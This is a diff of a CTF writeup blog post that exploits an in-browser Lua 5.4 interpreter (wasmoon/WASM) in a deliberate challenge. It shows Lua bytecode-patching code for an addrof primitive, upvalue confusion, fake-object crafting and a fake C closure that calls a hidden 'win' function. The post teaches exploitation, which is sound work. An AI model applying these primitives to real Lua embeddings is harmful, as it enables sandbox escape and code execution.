@@ -1,7 +1,7 @@
 ---
 title: "AlcaWASM Challenge Writeup - Pwning an In-Browser Lua Interpreter"
 description: "Gamedevs of the world, unite! Your favourite language is in danger -- the l33t wrongdoers have figured out how to BYOB (Bring Your Own Bytecode) and pwn the Lua v5.4 interpreter!"
-date: 2024-09-10T12:30:00+01:00
+date: 2024-09-12T12:30:00+01:00
 tags: ["writeup", "pwn", "wasm", "lua"]
 draft: false
 ---
@@ -12,18 +12,17 @@ draft: false
 
 At some point, some weeks ago, I've stumbled upon [this fascinating read](https://memorycorruption.net/posts/rce-lua-factorio/).
 In it, the author thoroughly explains an RCE
-(Remote Code Execution) they found on the lua interpreter used in the
+(Remote Code Execution) they found on the Lua interpreter used in the
 [Factorio](https://www.factorio.com/) game. I heartily recommend anyone
-interested in game scripting, exploit development or, in general,
-cool low-level hacks, to check out the blogpost, as it contains a real
-wealth of insights.
+interested in game scripting, exploit development, or just cool low-level hacks,
+to check out the blogpost -- as it contains a real wealth of insights.
 
-The author topped this off by releasing, at the end of the blogpost, a challenge
-consisting of a lua interpreter running in-browser for readers to exploit on
+The author topped this off by releasing a companion challenge to the writeup;
+it consists of a Lua interpreter, running in-browser, for readers to exploit on
 their own. Solving the challenge was a fun ride and a great addition to the content!
 
 The challenge is different enough from the blogpost that it makes
-sense to document a writeup, plus I find enjoyment in writing, so there's that.
+sense to document a writeup. Plus, I find enjoyment in writing, so there's that.
 
 I hope you'll find this content useful in your journey :)
 
@@ -38,7 +37,7 @@ I hope you'll find this content useful in your journey :)
 The challenge is available for anyone at [https://alcawasm.memorycorruption.net/](https://alcawasm.memorycorruption.net/)
 (and it does not require any login or registration).
 
-When opening it, you're welcomed by the following UI:
+When visiting it, you're welcomed by the following UI:
 
 ![AltImage](/images/alcawasm_ui.png)
 
@@ -46,8 +45,8 @@ These are the details of each section:
 
 - *Editor*: an [embedded VSCode](https://github.com/microsoft/monaco-editor) for
   convenient scripting.
-- *Console*: a console connected to the output of the lua interpreter.
-- *Definitions*: Useful definitions of the lua interpreter, including paddings.
+- *Console*: a console connected to the output of the Lua interpreter.
+- *Definitions*: Useful definitions of the Lua interpreter, including paddings.
 - *Goals*: a list of objectives towards finishing the challenge. They automatically
   update when a goal is reached, but I've found this to be a bit buggy, TBH.
   
@@ -59,13 +58,13 @@ experiments.
 ## Information Gathering
 
 After playing for a bit with the interpreter, I quickly decided I wanted
-to save some time to my future self by understanding the environment a little
+to save some time for my future self by understanding the environment a little
 bit better.
 
-> Note: this, to my experience, is a great idea. Always setup a lab!
+> Note: this is, in my experience, a great idea. Always setup your lab!
 
-Luckily, this is easy as opening the DevTools and using our uberly refined
-l33t intuition skills to find how the lua interpreter was embedded in the browser:
+Luckily, this is as easy as opening DevTools and using our uberly refined
+l33t intuition skills to find how the Lua interpreter was embedded in the browser:
 
 ![AltText](/images/alcawasm_osint_1.png)
 
@@ -77,13 +76,13 @@ With these mad OSINT skillz, I learned that the challenge is built with [wasmoon
 a package that compiles the Lua v5.4 repository to WASM and then provides
 JS bindings to instantiate and control the interpreter.
 
-This assumption is quickly corroborated by running:
+This assumption is quickly corroborated by executing the following:
 
 ```lua
 print(_VERSION)
 ```
 
-in the interface, which prints out `Lua 5.4` (you should try executing that code
+This prints out `Lua 5.4` (you should try executing that code
 to start getting comfortable with the interface).
 
 This information is valuable for exploitation purposes, as it gives us the
@@ -95,9 +94,9 @@ Let's dive in!
 ## Wait, it's all TValues?
 
 The first goal of the challenge is to gain the ability to leak addresses
-of TValues instantiated by the interpreter -- AKA the *addrof* primitive.
+of TValues (Lua variables) that we create -- AKA the *addrof* primitive.
 
-In the linked blogpost, the author shows how to confuse types in a for loop
+In the linked blogpost, the author shows how to confuse types in a for-loop
 to gain that. In particular, they use the following code to leak addresses:
 
 ```lua
@@ -129,11 +128,11 @@ version of the interpreter, the bytes used in the `gsub` patch are probably wron
 No worries, though, as the interpreter in the challenge is equipped with two
 useful features:
 
-- `asm` -> assembles Lua instructions into bytes
-- `bytecode` -> prints the bytecode of the provided Lua function
+- `asm` -> assembles Lua instructions to bytes
+- `bytecode` -> pretty-prints the bytecode of the provided Lua function
 
 Let's inspect the bytecode of the for loop function to understand
-what is there to patch:
+what is there we have to patch:
 
 ```
 # Code
@@ -164,11 +163,11 @@ locals (5) for 0x1099f0:
 upvalues (0) for 0x1099f0:
 ```
 
-The instruction to patch is the `FORPREP`, represented in little endian.
-Its binary value is `0xca800000`.
+The instruction to patch is the `FORPREP`. Represented in little endian,
+its binary value is `0xca800000`.
 
-We will patch it with a JMP 1. by doing so, the flow will jump to the
-FORLOOP instruction, which will add to the index the value of the *x* step
+We will patch it with a `JMP 1`. by doing so, the flow will jump to the
+`FORLOOP` instruction, which will increment the index with the value of the `x` step
 parameter. This way, by leveraging the type confusion, the returned
 index will contain the address of the TValue passed as input.
 
@@ -237,13 +236,11 @@ leak:     <--- OUTPUT SHOULD NOT BE NULL!
 > As a reliable way to test the addrof primitive,
 > I am using functions. In fact, by default, when passing
 > a function variable to the print function in Lua,
-> the address of the function is shown. We can use this
+> the address of the function is displayed. We can use this
 > to test if our primitive works.
 
-From this first test, it seems that the for loop is not returning what
-we expected -- that is, a leak of the address of the argument.
-
-To find out the reason about this, I took a little break and inspected
+From this test, it seems that the for loop is not returning the
+address leak we expect. To find out the reason about this, I took a little break and inspected
 the function responsible for this in the source code. The relevant snippets follow:
 
 ```c
@@ -297,18 +294,41 @@ Essentially, this code is doing the following:
 - If the loop is an integer loop (e.g. the TValue step has an integer type),
   the function is computing the updates and checks inline (but we don't really
   care as it's not our case).
-- If instead (as it is our case) the step TValue is not an integer, code goes
-  the *floatforloop* function, which handles updates and checks needed in a for loop.
-- In particular, the function computes the increment of the index and **checks
-  whether the incremented index is smaller than the limit**. In that case, the
+- If instead (as in our case) the step TValue is not an integer, execution reaches
+  the *floatforloop* function, which takes care of updating the index and
+  checking the limit.
+  - The function increments the index and **checks
+  if it still smaller than the limit**. In that case, the
   index will be updated and the for loop continues -- this is what we want!
 
-In brief, to make things work, we need to make sure that, once incremented
-with the address of the target TValue *x*, the index is not greater than the limit
-(the number 1000000000000, in our code).
+We need to make sure that, once incremented with the `x` step (which, remember,
+is the address of the target TValue), the index is not greater than the limit
+(the number 1000000000000, in our code). Most likely, the problem here is that
+the leaked address, interpreted as an IEEE 754 double, is bigger than the constant
+used, so the execution never reaches the `return i` that would return the leak.
 
-There's a simple path to solve this problem: **by using the variable x as
-the limit itself, we are sure that the loop will continue to the return statement.**
+We can test this assumption by slightly modifying the code to add a return value
+after the for-loop ends:
+
+```lua
+# Code
+asnum = load(string.dump(function(x)
+    for i = 0, 1000000000000, x do return i end
+    return -1 <--- IF x > 1000000000000, EXECUTION WILL GO HERE 
+end):gsub("\xca\x80\0\0", "\x38\0\0\x80"))
+
+foo = function() print(1) end
+print("foo:", foo)
+
+print("leak:",asnum(foo))
+
+# Output
+foo:	LClosure: 0x10df18
+leak:	-1 <--- OUR GUESS IS CONFIRMED
+```
+
+There's a simple solution to this problem: **by using x as both the step and
+the limit, we are sure that the loop will continue to the return statement.**
 
 The leak experiment thus becomes:
 
@@ -331,18 +351,16 @@ leak:	2.3107345851353e-308
 Looks like we are getting somewhere.
 
 However, the clever will notice that the address of the function and the
-printed leaks are not the same thing. This is well explained in the original blogpost:
-lua thinks that the returned address is a double, thus the IEEE 754 representation
-is used for the number.
-
-In the blogpost, the author embarks on a riveting quest to natively transform
-this double in the integer binary representation needed to complete the `addrof`
+printed leaks do not seem to match. This is well explained in the original writeup:
+Lua thinks that the returned address is a double, thus it will use the IEEE 754 representation.
+Indeed, in the blogpost, the author embarks on an adventurous quest to natively transform
+this double in the integer binary representation needed to complete the addrof
 primitive.
 
-<u>We don't need this.</u> In fact, since Lua 5.3, the interpreter supports
+**We don't need this.** In fact, since Lua 5.3, the interpreter supports
 integer types!
 
-This makes completing the `addrof` primitive a breeze,
+This makes completing the addrof primitive a breeze,
 by resorting to the native `string.pack` and `string.unpack` functions:
 
 ```
@@ -366,9 +384,12 @@ leak: 0x10a0e8
 
 Good, our leak now finally matches the function address!
 
+> Note: another way to solve the limit problem is to use the maximum
+> double value, which roughly amounts to 2^1024.
+
 ## Trust is the weakest link
 
-Next piece of the puzzle is to find a way to craft fake objects.
+The next piece of the puzzle is to find a way to craft fake objects.
 
 For this, we can pretty much use the same technique used in the blogpost:
 
@@ -379,11 +400,11 @@ confuse = load(string.dump(function()
     local foo
     local bar
     local target
-    return (function() -- target will point to this closure
+    return (function() <--- THIS IS THE TARGET CLOSURE WE ARE RETURNING
       (function()
         print(foo)
         print(bar)
-        print("Leaking outer closure: ",target)
+        print("Leaking outer closure: ",target) <--- TARGET UPVALUE SHOULD POINT TO THE TARGET CLOSURE
       end)()
     end)
 end):gsub("(\x01\x00\x00\x01\x01\x00\x01)\x02", "%1\x03", 1))
@@ -401,30 +422,30 @@ Returned outer closure:	LClosure: 0x109a98
 Calling it...
 nil
 nil
-Leaking outer closure: 	LClosure: 0x109a98
+Leaking outer closure: 	LClosure: 0x109a98 <--- THIS CONFIRMS THAT THE CONFUSED UPVALUE POINTS TO THE RIGHT THING
 ```
 
 Two notable mentions here:
 
-- Again, in order to make things work with this interpreter I had to change
+1. Again, in order to make things work with this interpreter I had to change
   the bytes in the patching. In this case, as the patching happens not in
   the opcodes but rather in the upvalues of the functions, I resorted
-  to manually examine the bytecode dump and find a pattern that seemed
+  to manually examining the bytecode dump to find a pattern that seemed
   the right one to patch -- in this case, what we are patching is the
   "upvals table" of the outer closure.
 
-- We are returning the outer closure to make sure that the leak is right.
-  In fact, in the code, I'm printing the address of the outer closure
+2. We are returning the outer closure to verify that the upvalue confusion
+   is working. In fact, in the code, I'm printing the address of the outer closure
   (which is returned by the function), and printing the value of the
-  patched `target` upvalue, and expecting them to match.
+  patched target upvalue, and expecting them to match.
   
-From the output of the interpreter, we confirmed that we have
+From the output of the interpreter, we confirm that we have
 successfully confused upvalues.
 
 ## If it looks like a Closure
 
-We can leak the closure next to the last upvalue.
-But can we overwrite it? Let's check it:
+Ok, we can leak the outer closure by confusing upvalues.
+But can we overwrite it? Let's check:
 
 ```lua
 
@@ -457,8 +478,8 @@ RuntimeError: Aborted(segmentation fault)
 **Execution aborted with a segmentation fault.**
 
 To make debugging simple, and ensure that the segmentation fault
-depends from a situation that I could control, I've ran the same
-script against the `lua` interpreter cloned locally and built with
+depends on a situation that I could control, I've passed the same
+script to the standalone Lua interpreter cloned locally, built with
 debugging symbols.
 
 What we learn from GDB confirms this is the happy path:
@@ -473,38 +494,38 @@ from the closure -> which will end up in error because
 the object is not really a closure, but a string, **thanks
 to the overwrite in the inner closure.**
 
-...except this is not at all what is happening in the challenge.
+...except this *is not at all* what is happening in the challenge.
 
 ### Thanks for all the definitions
 
-If you try to execute in the challenge the scripting above repeatedly,
+If you try to repeatedly execute (in the challenge UI) the script above,
 you will notice that sometimes the error appears as a segmentation fault,
 other times as an aligned fault, and other times it does not even errors.
 
 The reason is that, probably due to how `wasmoon` is compiled (and the
 fact that it uses WASM), some of the pointers and integers will have
 a 32 bit size, instead of the expected 64. The consequence of this is that
-many of the paddings in the structs will not match what we see in standalone
-lua interpreter
+many of the paddings in the structs will not match what we have in standalone
+Lua interpreter!
 
-> Note: while this makes the usability of the standalone lua as a debugging tool...questionable,
+> Note: while this makes the usability of the standalone Lua as a debugging tool...questionable,
 > I think it was still useful and therefore I've kept it in the writeup.
 
-In the linked blogpost, the author chooses the path of a fake constants table
+This could be a problem, for our exploit-y purposes. In the linked blogpost,
+the author chooses the path of a fake constants table
 to craft a fake object. This is possible because of two facts:
 
-1. In the `LClosure` struct, the address of its `Proto` struct, which holds
+1. In the LClosure struct, the address of its Proto struct, which holds
    among the other things the constants values, is placed
    **24 bytes after the start of the struct**.
-2. In the `TString` struct, the content of the string is placed
+2. In the TString struct, the content of the string is placed
    **24 bytes after the start of the struct**.
 
-Therefore, when replacing an `LClosure` with a `TString` due to upvalues confusion,
-this aligns handsomely, and the attacker controls the `Proto` pointer and thus
-the chain works.
+Therefore, when replacing an LClosure with a TString via upvalues confusion,
+the two align handsomely, and the attacker thus controls the Proto pointer,
+making the chain work.
 
-However, these are the definitions of `LClosure` and `TString` as provided
-in the challenge:
+However, here's the definitions of LClosure and TString for the challenge:
 
 ```c
 struct TString {
@@ -534,28 +555,30 @@ struct LClosure {
 }
 ```
 
-looking at the definition, it is now clear why the technique
+Looking at the definition, it is now clear why the technique
 used in the blogpost would not work in this challenge:
-because even if we can confuse a `TString` with an `LClosure`,
-the bytes of the `Proto` pointer are <u>not under our control</u>.
+because even if we can confuse a TString with an LClosure,
+the bytes of the Proto pointer are **not under our control**!
+
+![AltText](/images/alcawasm_closure_meme.jpg)
 
 Of course, there is another path.
 
-### Cheer Up(value)
+### Cheer UpValue
 
 In the linked blogpost, the author mentions another way of crafting
-fake objects that doesn't go through the `Proto` defintion of the closure.
+fake objects that doesn't go through overwriting the Prototype pointer.
 Instead, it uses upvalues.
 
-By looking at the definitions listed above, you might have noticed that,
-while the `Proto` pointer in the `LClosure` cannot be controlled with
-a `TString`, the pointer to the `upvals` array is instead nicely
+By looking at the definitions listed previously, you might have noticed that,
+while the Proto pointer in the LClosure cannot be controlled with
+a TString, the pointer to the `upvals` array is instead nicely
 aligned with the start of the string contents.
 
 Indeed, the author mentions that fake objects can be created via
 upvalues too (but then chooses another road).
 
-To see how, we can inspect the code of the `GETUPVAL` opcode in lua,
+To see how, we can inspect the code of the `GETUPVAL` opcode in Lua,
 the instruction used to retrieve upvalues:
 
 ```c
@@ -580,16 +603,16 @@ struct UpVal {
 
 ...
 
-    vmcase(OP_GETUPVAL) {
-    StkId ra = RA(i);
-    int b = GETARG_B(i);
-    setobj2s(L, ra, cl->upvals[b]->v.p);
-    vmbreak;
-    }
+vmcase(OP_GETUPVAL) {
+  StkId ra = RA(i);
+  int b = GETARG_B(i);
+  setobj2s(L, ra, cl->upvals[b]->v.p);
+  vmbreak;
+} 
 ```
 
-The code visits the `cl->upvals` array, navigates to the `b`th element,
-and takes the pointer to the `TValue` value (`v.p`).
+The code visits the `cl->upvals` array, navigates to the bth element,
+and takes the pointer to the TValue value `v.p`.
 
 All in all, what we need to craft a fake object is depicted in the image below:
 
@@ -601,9 +624,9 @@ This deserves a try!
 
 A good test of our object artisanship skills would be to create
 a fake string and have it correctly returned by our `craft_object`
-primitive. We will choose an arbitrary length to the string, and
-then verify whether lua agrees on its length once the object
-is crafted to confirm the primitive.
+primitive. We will choose an arbitrary length for the string, and
+then verify whether Lua agrees on its length once the object
+is crafted. This should confirm the primitive works.
 
 Down below, I will list the complete code of the experiment,
 which implements the diagram above:
@@ -627,7 +650,7 @@ function addr_of(variable)
   return string.unpack("L", string.pack("d", asnum(variable)))
 end
 
---  next + tt/marked/extra/padding/hash + len
+-- next + tt/marked/extra/padding/hash + len
 fakeStr = ubn(0x0, 12) .. ubn(0x1337, 4)
 print(string.format("Fake str at: 0x%2x", addr_of(fakeStr)))
 
@@ -665,12 +688,12 @@ print(string.format("Crafted string length is %x", #crafted))
 ```
 
 > Note: as you can see, in the outer closure, I am returning the faked object by
-> returning `_ENV`. This is the first upvalue of the closure, pushed
+> returning the _ENV variable. This is the first upvalue of the closure, pushed
 > automatically by the interpreter for internal reasons. This way,
 > I am instructing the interpreter to return **the first upvalue**
-> in the upvalues array.
+> in the upvalues array, which points to our crafted UpValue.
 
-The output of the script confirms that our object has finally citizenship:
+The output of the script confirms that our object finally has citizenship:
 
 ```
 Fake str at: 0x10bd60
@@ -680,7 +703,7 @@ Fake Closureat : 0x109298
 nil
 nil
 LClosure: 0x10a280
-Crafted string length is 1337
+Crafted string length is 1337 <--- WE PICKED THIS LENGTH!
 ```
 
 ## Escape from Alcawasm
@@ -697,57 +720,57 @@ Among these, we have:
 In this last section, I'll explain why the latter is everything we
 need to complete the challenge.
 
-To understand why, it's time to go back to the information gathering.
+To understand how, it's time to go back to the information gathering.
 
 ### (More) Information Gathering
 
 The description of the challenge hints that, in the WASM context,
 there is some kind of "win" function that cannot be invoked
-directly via lua, and that's the target of our exploit.
+directly via Lua, and that's the target of our exploit.
 
 Inspecting the JS code that instantiates the WASM assembly
 gives some more clarity on this:
 
 ```javascript
-                    a || (n.global.lua.module.addFunction((e => {
-                        const t = n.global.lua.lua_gettop(e)
-                          , r = [];
-                        for (let a = 1; a <= t; a++)
-                            switch (n.global.lua.lua_type(e, a)) {
-                            case 4:
-                                r.push(n.global.lua.lua_tolstring(e, a));
-                                break;
-                            case 3:
-                                r.push(n.global.lua.lua_tonumberx(e, a));
-                                break;
-                            default:
-                                console.err("Unhandled lua parameter")
-                            }
-                        return 1 != r.length ? self.postMessage({
-                            type: "error",
-                            data: "I see the exit, but it needs a code to open..."
-                        }) : 4919 == r[0] ? self.postMessage({
-                            type: "win"
-                        }) : self.postMessage({
-                            type: "error",
-                            data: "Invalid parameter value, maybe more l333t needed?"
-                        }),
-                        0
-                    }
-                    ), "ii"),
+  a || (n.global.lua.module.addFunction((e => {
+      const t = n.global.lua.lua_gettop(e)
+        , r = [];
+      for (let a = 1; a <= t; a++)
+          switch (n.global.lua.lua_type(e, a)) {
+          case 4:
+              r.push(n.global.lua.lua_tolstring(e, a));
+              break;
+          case 3:
+              r.push(n.global.lua.lua_tonumberx(e, a));
+              break;
+          default:
+              console.err("Unhandled lua parameter")
+          }
+      return 1 != r.length ? self.postMessage({
+          type: "error",
+          data: "I see the exit, but it needs a code to open..."
+      }) : 4919 == r[0] ? self.postMessage({
+          type: "win"
+      }) : self.postMessage({
+          type: "error",
+          data: "Invalid parameter value, maybe more l333t needed?"
+      }),
+      0
+  }
+  ), "ii"),
 ```
 
 Uhm, I'm no WASM expert, but it looks like this piece of code might just
 be the "win" function I was looking for.
 
-Its code is not too complex: the function takes a `TValue` as input (`e`),
+Its code is not too complex: the function takes a TValue *e* as input,
 checks its value, converting it either to string or integer, and stores
-the conversion to a JS array. Then, the value pushed is compared against
-the number 4919 (0x1337 for you), and if it matches, the "win" message is
-sent (most likely granting the final achievement).
+the result into a JS array. Then, the value pushed is compared against
+the number 4919 (0x1337 for y'all), and if it matches, the "win" message is
+sent (most likely then granting the final achievement).
 
 Looking at this, it seems what we need to do is to find a way to craft
-a fake lua function that points to the function registered by `n.global.lua.module.addFunction`,
+a fake Lua function that points to the function registered by `n.global.lua.module.addFunction`,
 and invoke it with the 0x1337 argument.
 
 But how does that `addFunction` work, and how can we find it in the WASM context?
@@ -763,11 +786,10 @@ https://emscripten.org/docs/porting/connecting_cpp_and_javascript/Interacting-wi
 > and the JavaScript function you sent to addFunction will be called.
 
 Thus, it seems that `wasmoon` makes use of Emscripten, the LLVM-based WASM toolchain,
-to build the WASM module containing the lua interpreter.
+to build the WASM module containing the Lua interpreter.
 
 And, as it seems, Emscripten provides a way to register JavaScript functions
 that will become "callable" in the WASM.
-
 Digging a little more, and we see how the `addFunction` API is implemented:
 
 https://github.com/emscripten-core/emscripten/blob/1f519517284660f4b31ef9b7f921bf6ba66c4041/src/library_addfunction.js#L196
@@ -808,14 +830,14 @@ details on the nature of this functions table.
 What I did understand, though, is that WASM binaries have a peculiar
 way of representing function pointers. They are not actual "addresses"
 pointing to code. Instead, function pointers are integer **indices** that
-are used to reference a tables of, well, functions. And a module can have
+are used to reference tables of, well, functions. And a module can have
 multiple function tables, for direct and indirect calls -- and no, I'm
 not embarrassed of admitting I've learned most of this from ChatGPT.
 
 Now, to understand more about this point, I placed a breakpoint in a pretty
-random spot of the webassembly, and then restarted the challenge -- the
+random spot of the WebAssembly, and then restarted the challenge -- the
 goal was to stop in a place where the chrome debugger had context on the
-executing wasm, and explore from there.
+executing WASM, and explore from there.
 
 The screenshot below was taken from the debugger, and it shows variables
 in the scope of the execution:
@@ -831,6 +853,8 @@ can call the `addFunction`, call it a few times, then stop again inside
 the wasm and check if the table is bigger:
 
 ![AltText](/images/alcawasm_addfunction.png)
+
+And the result in the WASM context, afterwards:
 
 ![AltText](/images/alcawasm_table2.png)
 
@@ -883,8 +907,8 @@ as the following line is the culprit for the error:
 call_indirect (param i32) (result i32)
 ```
 
-Bingo! This tells us that an indirect call
-is dispatched on our fake C function.
+Bingo! This tells us that our fake C functoin is precisely
+dispatching a WASM indirect call.
 
 At this point, the puzzle is complete :)
 
@@ -898,7 +922,7 @@ we can finish up the exploit, supplying the correct parameter:
 ```lua
 
 # Code
--- function pointer + type
+-- function pointer (win=199) + type 
 fakeFunction = ubn(199, 8) .. ubn(22, 8)
 fakeUpvals = ubn(0x0, 8) .. ubn(addr_of(fakeFunction) + 16, 8)
 fakeClosure = ubn(addr_of(fakeUpvals) + 16, 8)
@@ -913,3 +937,15 @@ and...
 ![AltText](/images/alcawasm_win.png)
 
 ## Wrapping it up
+
+Solving this challenge was true hacker enjoyment -- this is the joy of weird machines!
+
+Before closing this entry, I wanted to congratulate the author of the
+challenge (and of the attached blogpost). It is rare to find content of this quality.
+Personally, I think that the idea of preparing challenges as companion content for
+hacking writeups is a great honking ideas, and we should do more of it.
+
+In this blogpost, we hacked with interpreters, confusions, exploitation primitives and
+WASM internals. I hope you've enjoyed the ride, and I salute you until the next one.
+
+Enjoy!
